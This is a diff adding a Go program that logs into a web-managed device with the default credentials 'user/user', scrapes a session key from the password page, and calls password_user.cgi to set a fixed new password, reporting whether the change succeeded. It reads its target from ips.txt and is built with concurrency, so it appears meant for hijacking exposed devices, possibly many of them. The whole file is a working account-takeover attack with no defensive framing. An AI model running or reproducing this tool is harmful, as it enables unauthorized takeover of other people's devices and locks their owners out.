@@ -1,0 +1,217 @@
+package main
+
+import (
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"regexp"
+	"strings"
+	"sync"
+)
+
+var (
+	semaphore = make(chan struct{}, 100) // Set the maximum number of concurrent goroutines to 100
+	wg        sync.WaitGroup
+)
+
+func main() {
+	// Read IP:PORT from ips.txt
+	ipPort, err := readIPPortFromFile("ips.txt")
+	if err != nil {
+		fmt.Println("Error reading IP:PORT from file:", err)
+		return
+	}
+
+	urlLogin := fmt.Sprintf("http://%s/login", ipPort)
+	urlPasswordUser := fmt.Sprintf("http://%s/password_user.html", ipPort)
+	urlPasswordUserCGI := fmt.Sprintf("http://%s/password_user.cgi", ipPort)
+
+	// First request to retrieve SESSIONID
+	sessionID, err := getSessionID(urlLogin)
+	if err != nil {
+		fmt.Println("Error retrieving SESSIONID:", err)
+		return
+	}
+
+	// Second request using retrieved SESSIONID
+	body, err := sendGetRequest(urlPasswordUser, sessionID)
+	if err != nil {
+		fmt.Println("Error sending request:", err)
+		return
+	}
+
+	// Extract sessionKey value from response body
+	sessionKey := extractSessionKey(body)
+	if sessionKey == "" {
+		fmt.Println("Error extracting sessionKey from response body")
+		return
+	}
+
+	// Final request using retrieved SESSIONID and sessionKey
+	finalResponse, err := sendFinalRequest(urlPasswordUserCGI, sessionID, sessionKey)
+	if err != nil {
+		fmt.Println("Error sending final request:", err)
+		return
+	}
+
+	// Check if the response body contains "Password change successful"
+	if strings.Contains(string(finalResponse), "Password change successful") {
+		fmt.Println("Password change successful! Final request is successful.")
+	} else {
+		fmt.Println("Final request is unsuccessful.")
+	}
+}
+
+func extractSessionKey(body []byte) string {
+	// Use regular expression to extract sessionKey value
+	re := regexp.MustCompile(`<input type='hidden' name='sessionKey' value='([^']+)'`)
+	match := re.FindSubmatch(body)
+	if len(match) < 2 {
+		return ""
+	}
+
+	return string(match[1])
+}
+
+func sendFinalRequest(url, sessionID, sessionKey string) ([]byte, error) {
+	// Construct URL with sessionKey
+	url += fmt.Sprintf("?inOrgPassword=user&inPassword=Tb0t0nT01pp&pwdCfm=Tb0t0nT01pp&sessionKey=%s", sessionKey)
+
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36")
+	req.Header.Add("Connection", "close")
+	req.Header.Add("Cookie", fmt.Sprintf("SESSIONID=%s", sessionID))
+
+	// Acquire a semaphore token before sending the request
+	semaphore <- struct{}{}
+
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer func() { <-semaphore }()
+
+		client := &http.Client{
+			CheckRedirect: func(req *http.Request, via []*http.Request) error {
+				return http.ErrUseLastResponse // Do not follow redirects
+			},
+		}
+
+		resp, err := client.Do(req)
+		if err != nil {
+			fmt.Println("Error sending request:", err)
+			return
+		}
+		defer resp.Body.Close()
+
+		// You can choose to print the response body if needed
+		// finalResponse, err := ioutil.ReadAll(resp.Body)
+		// if err != nil {
+		// 	fmt.Println("Error reading response body:", err)
+		// 	return
+		// }
+		// fmt.Println("Final Response Body:", string(finalResponse))
+	}()
+
+	wg.Wait() // Wait for all goroutines to finish
+	close(semaphore) // Close the semaphore channel
+
+	// Return an empty response as we didn't capture the response body
+	return []byte{}, nil
+}
+
+func getSessionID(url string) (string, error) {
+	payload := strings.NewReader("username=user&password=user")
+
+	req, err := http.NewRequest("POST", url, payload)
+	if err != nil {
+		return "", err
+	}
+
+	req.Header.Add("Content-Length", "27")
+	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36")
+	req.Header.Add("Connection", "close")
+
+	client := &http.Client{
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse // Do not follow redirects
+		},
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	// Extract SESSIONID value from Set-Cookie header
+	sessionID := extractSessionID(resp.Header.Get("Set-Cookie"))
+	return sessionID, nil
+}
+
+func sendGetRequest(url, sessionID string) ([]byte, error) {
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36")
+	req.Header.Add("Connection", "close")
+	req.Header.Add("Cookie", fmt.Sprintf("SESSIONID=%s", sessionID))
+
+	client := &http.Client{
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse // Do not follow redirects
+		},
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	return body, nil
+}
+
+func extractSessionID(cookieHeader string) string {
+	// Find the index of SESSIONID=
+	index := strings.Index(cookieHeader, "SESSIONID=")
+	if index == -1 {
+		return ""
+	}
+
+	// Extract the value of SESSIONID
+	startIndex := index + len("SESSIONID=")
+	endIndex := strings.Index(cookieHeader[startIndex:], ";")
+	if endIndex == -1 {
+		return cookieHeader[startIndex:]
+	}
+
+	return cookieHeader[startIndex : startIndex+endIndex]
+}
+
+func readIPPortFromFile(filename string) (string, error) {
+	file, err := os.Open(filename)
+	if err != nil {
+		return "", err
+	}
+	defer file.Close()
+
+	var ipPort string
+	_, err = fmt.Fscan(file, &ipPort)
+	if err != nil {
+		return "", err
+	}
+
+	return ipPort, nil
+}
